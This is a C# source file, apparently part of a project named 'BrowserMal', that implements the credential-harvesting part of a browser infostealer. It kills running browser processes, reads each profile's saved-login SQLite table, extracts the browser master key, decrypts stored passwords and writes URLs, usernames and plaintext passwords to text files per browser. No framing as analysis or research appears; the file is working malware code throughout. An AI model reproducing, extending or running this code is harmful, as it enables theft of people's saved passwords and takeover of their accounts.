using BrowserMal.Browser;
using System.Collections.Generic;
using System.IO;
using BrowserMal.Util;
using BrowserMal.AES;
using SqliteReader;
using BrowserMal.Filesaver;

namespace BrowserMal.Credential
{
    public class CredentialManager
    {
        private static Dictionary<string, List<CredentialModel>> credentialModels;

        public CredentialManager() => credentialModels = new Dictionary<string, List<CredentialModel>>();

        public void Init(ref List<BrowserModel> browsers)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                ProcessUtil.KillProcess(browser.ProcessName);

                List<CredentialModel> logins = GetLogins(browser.Location, out byte[] masterKey);
                browser.MasterKey = masterKey;

                if (logins.Count == 0)
                    continue;

                credentialModels.Add(browser.Name, logins);

                FileManager.Save<CredentialModel>(logins, $"{browser.Name}_logins.txt");
            }
        }

        private List<CredentialModel> GetLogins(string path, out byte[] masterKey)
        {
            List<string> profiles = Browser.Util.GetAllProfiles(path, Browser.Util.LOGIN_DATA);
            List<CredentialModel> creds = new List<CredentialModel>();
            byte[] data = null;

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, out byte[] masterkeyBytes));
                data = masterkeyBytes;
            }

            masterKey = data;
            return creds;
        }

        private List<CredentialModel> GetProfileLogins(string path, out byte[] masterKeyBytes)
        {
            List<CredentialModel> credentialModels = new List<CredentialModel>();

            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
            sqLiteHandler.ReadTable("logins");

            byte[] masterKey = AesGcm256.GetMasterKey(path);

            if (masterKey == null)
            {
                masterKeyBytes = null;
                return new List<CredentialModel>();
            }

            masterKeyBytes = masterKey;

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string password = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(i, "password_value"), masterKey);

                    if (string.IsNullOrEmpty(password))
                        continue;

                    credentialModels.Add(new CredentialModel()
                    {
                        Url = sqLiteHandler.GetValue(i, "origin_url"),
                        Username = sqLiteHandler.GetValue(i, "username_value"),
                        Password = password
                    });
                }
                catch { }
            }

            return credentialModels;
        }
    }
}
